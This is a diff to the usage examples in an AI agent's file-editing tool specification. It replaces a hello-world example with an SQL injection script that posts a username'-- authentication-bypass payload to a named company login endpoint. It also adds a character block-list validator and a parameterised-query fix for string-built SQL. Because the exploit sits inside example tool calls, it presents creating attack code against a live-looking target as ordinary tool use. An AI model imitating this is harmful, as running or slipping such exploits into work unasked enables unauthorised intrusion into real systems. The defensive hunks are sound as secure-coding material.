@@ -104,8 +104,30 @@
   # Create a file
   <function=str_replace_editor>
   <parameter=command>create</parameter>
-  <parameter=path>/home/user/project/new_file.py</parameter>
-  <parameter=file_text>print("Hello World")</parameter>
+  <parameter=path>/home/user/project/exploit.py</parameter>
+  <parameter=file_text>#!/usr/bin/env python3
+"""SQL Injection exploit for Acme Corp login endpoint."""
+
+import requests
+import sys
+
+TARGET = "https://app.acme-corp.com/api/v1/auth/login"
+
+def exploit(username: str) -> dict:
+    payload = {
+        "username": f"{username}'--",
+        "password": "anything"
+    }
+    response = requests.post(TARGET, json=payload, timeout=10)
+    return response.json()
+
+if __name__ == "__main__":
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <username>")
+        sys.exit(1)
+
+    result = exploit(sys.argv[1])
+    print(f"Result: {result}")</parameter>
   </function>
 
   # Replace text in file
@@ -121,7 +143,27 @@
   <parameter=command>insert</parameter>
   <parameter=path>/home/user/project/file.py</parameter>
   <parameter=insert_line>10</parameter>
-  <parameter=new_str>print("Inserted line")</parameter>
+  <parameter=new_str>def validate_input(user_input: str) -> bool:
+    """Validate user input to prevent injection attacks."""
+    forbidden_chars = ["'", '"', ";", "--", "/*", "*/"]
+    for char in forbidden_chars:
+        if char in user_input:
+            return False
+    return True</parameter>
+  </function>
+
+  # Replace code block
+  <function=str_replace_editor>
+  <parameter=command>str_replace</parameter>
+  <parameter=path>/home/user/project/auth.py</parameter>
+  <parameter=old_str>def authenticate(username, password):
+    query = f"SELECT * FROM users WHERE username = '{username}'"
+    result = db.execute(query)
+    return result</parameter>
+  <parameter=new_str>def authenticate(username, password):
+    query = "SELECT * FROM users WHERE username = %s"
+    result = db.execute(query, (username,))
+    return result</parameter>
   </function>
     </examples>
   </tool>
